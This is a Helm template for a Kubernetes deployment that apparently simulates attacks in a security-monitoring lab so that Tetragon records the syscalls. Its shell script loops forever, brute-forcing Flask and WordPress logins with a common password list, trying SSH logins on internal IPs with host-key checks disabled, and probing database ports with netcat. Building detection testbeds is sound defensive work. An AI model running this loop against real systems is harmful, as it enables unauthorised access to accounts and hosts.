# Brute-force simulation deployment
# Using alpine+shell to ensure Tetragon can capture syscalls
{{- if .Values.bruteforce.enabled }}
apiVersion: apps/v1
kind: Deployment
metadata:
  name: {{ include "malicious-containers.fullname" . }}-bruteforce
  labels:
    {{- include "malicious-containers.labels" . | nindent 4 }}
    app.kubernetes.io/component: bruteforce
    kids-label: "1"
spec:
  replicas: 1
  selector:
    matchLabels:
      {{- include "malicious-containers.selectorLabels" . | nindent 6 }}
      app.kubernetes.io/component: bruteforce
  template:
    metadata:
      labels:
        {{- include "malicious-containers.selectorLabels" . | nindent 8 }}
        app.kubernetes.io/component: bruteforce
        kids-label: "1"
    spec:
      {{- with .Values.nodeSelector }}
      nodeSelector:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      {{- with .Values.tolerations }}
      tolerations:
        {{- toYaml . | nindent 8 }}
      {{- end }}
      containers:
        - name: bruteforce
          image: alpine:latest
          command: ["/bin/sh", "-c"]
          args:
            - |
              apk add --no-cache curl netcat-openbsd openssh-client > /dev/null 2>&1
              echo "Starting brute-force simulation..."

              USERS="admin root user test guest operator"
              PASSWORDS="password 123456 admin root letmein welcome qwerty abc123 admin123 kids_password"

              while true; do
                echo "[$(date)] === Brute-force cycle start ==="

                # Simulate HTTP login brute-force (Flask-Todo)
                echo "[$(date)] Attacking Flask-Todo HTTP login..."
                for user in $USERS; do
                  for pass in $PASSWORDS; do
                    curl -s -o /dev/null -X POST \
                      http://flask-todo.benign-workloads.svc.cluster.local:5000/ \
                      -d "username=${user}&password=${pass}" 2>/dev/null || true
                  done
                done

                # Simulate WordPress brute-force
                echo "[$(date)] Attacking WordPress login..."
                for user in $USERS; do
                  for pass in $PASSWORDS; do
                    curl -s -o /dev/null -X POST \
                      http://wordpress-app.benign-workloads.svc.cluster.local/wp-login.php \
                      -d "log=${user}&pwd=${pass}" 2>/dev/null || true
                  done
                done

                # Simulate SSH brute-force (connection attempts)
                echo "[$(date)] Attacking SSH on internal nodes..."
                for ip in 10.0.1.27 10.0.1.224 10.0.1.142; do
                  for user in $USERS; do
                    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
                      -o BatchMode=yes ${user}@${ip} exit 2>/dev/null || true
                  done
                done

                # Simulate MySQL brute-force via port scanning
                echo "[$(date)] Attacking MySQL/DB ports..."
                for ip in 10.0.1.27 10.0.1.224; do
                  nc -zv -w 2 $ip 3306 2>/dev/null || true
                  nc -zv -w 2 $ip 5432 2>/dev/null || true
                done

                echo "[$(date)] === Cycle complete. Sleeping 10s ==="
                sleep 10
              done
          resources:
            requests:
              cpu: 50m
              memory: 64Mi
            limits:
              cpu: 200m
              memory: 128Mi
{{- end }}
